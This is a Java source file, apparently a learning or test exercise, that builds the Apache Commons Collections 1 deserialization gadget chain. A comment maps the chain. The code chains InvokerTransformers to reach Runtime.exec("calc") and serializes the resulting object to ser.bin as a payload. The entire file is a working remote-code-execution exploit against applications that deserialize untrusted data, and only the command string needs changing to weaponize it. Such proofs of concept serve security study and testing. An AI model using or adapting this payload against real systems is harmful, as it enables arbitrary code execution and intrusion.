package org.CC.CC1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * 		ObjectInputStream.readObject()
 * 			AnnotationInvocationHandler.readObject()
 * 				Map(Proxy).entrySet()
 * 					AnnotationInvocationHandler.invoke()
 * 						MapEntry.setValue()
 * 					      TransformedMap.checkSetValue()
 * 							ChainedTransformer.transform()
 * 								ConstantTransformer.transform()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Class.getMethod()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Runtime.getRuntime()
 * 								InvokerTransformer.transform()
 * 									Method.invoke()
 * 										Runtime.exec()
 */

public class CC1Test1 {
    public static void main(String[] args) throws Exception {
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class,Class[].class}, new Object[]{"getRuntime",null}),
                new InvokerTransformer("invoke", new Class[]{Object.class,Object[].class}, new Object[]{Runtime.class,null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        HashMap<Object,Object> map = new HashMap<>();
        map.put("value",123);
        Map<Object,Object> decorate = TransformedMap.decorate(map, null, chainedTransformer);
        Class<?> c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor<?> constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object o = constructor.newInstance(SuppressWarnings.class, decorate);
        serialize(o);
    }
    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

}
